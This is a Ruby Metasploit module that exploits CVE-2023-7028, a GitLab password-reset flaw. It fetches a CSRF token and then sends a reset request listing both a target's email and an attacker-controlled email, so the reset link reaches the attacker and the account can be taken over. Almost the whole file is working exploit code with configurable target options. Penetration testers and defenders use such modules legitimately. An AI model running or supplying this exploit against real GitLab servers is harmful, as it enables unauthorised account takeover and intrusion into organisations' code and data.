##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name' => 'GitLab Password Reset Account Takeover',
      'Description' => 'This module exploits an account-take-over vulnerability that allows users
        to take control of a gitlab account without user interaction.

        The vulnerability lies in the password reset functionality. Its possible to provide 2 emails
        and the reset code will be sent to both. It is therefore possible to provide the e-mail
        address of the target account as well as that of one we control, and to reset the password.

        2-factor authentication prevents this vulnerability from being exploitable. There is no
        discernable difference between a vulnerable and non-vulnerable server response.

        Vulnerable versions include:
        16.1 < 16.1.6,
        16.2 < 16.2.9,
        16.3 < 16.3.7,
        16.4 < 16.4.5,
        16.5 < 16.5.6,
        16.6 < 16.6.4,
        and 16.7 < 16.7.2.',
      'Author' => [
        'h00die', # msf module
        'asterion04' # discovery
      ],
      'License' => MSF_LICENSE,
      'References' => [
        ['CVE', '2023-7028'],
        ['URL', 'https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/'],
        ['URL', 'https://github.com/duy-31/CVE-2023-7028']
      ],
      'DisclosureDate' => '2024-01-11',
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETEMAIL', [ true, 'The email address of the account to compromise' ]),
        OptString.new('MYEMAIL', [ true, 'An email address to also send the password reset email to' ]),
        OptString.new('TARGETURI', [true, 'The path to GitLab', '/'])
      ]
    )
  end

  def run_host(_ip)
    vprint_status('Obtaining CSRF token')
    res = send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri, 'users', 'sign_in')
    )

    fail_with(Failure::Unreachable, 'No response received') if res.nil?

    fail_with(Failure::UnexpectedReply, 'Unable to find CSRF token') unless res.body =~ %r{<meta name="csrf-token" content="([^"]+)" />}
    print_good("Received CSRF Token: #{::Regexp.last_match(1)}")
    vprint_status('Sending password reset request')
    email_field_equals = "#{CGI.escape('user[email][]')}="
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'users', 'password'),
      'data' => [
        "#{email_field_equals}#{CGI.escape(datastore['TARGETEMAIL'])}",
        "#{email_field_equals}#{CGI.escape(datastore['MYEMAIL'])}",
        "authenticity_token=#{::Regexp.last_match(1)}"
      ].join('&')
    )
    fail_with(Failure::Unreachable, 'No response received') if res.nil?

    if res.code == 302
      print_good("Sent, check #{datastore['MYEMAIL']} for a possible password reset link (failure is blind)")
    elsif res.code == 422 || res.body.include?('The change you requested was rejected.') # happened when I ran module 3 times within a minute or so
      print_bad('Request failed, server rejected. Try again later or a different user')
    else
      print_bad("Request failed, http code: #{res.code}")
    end
  end
end
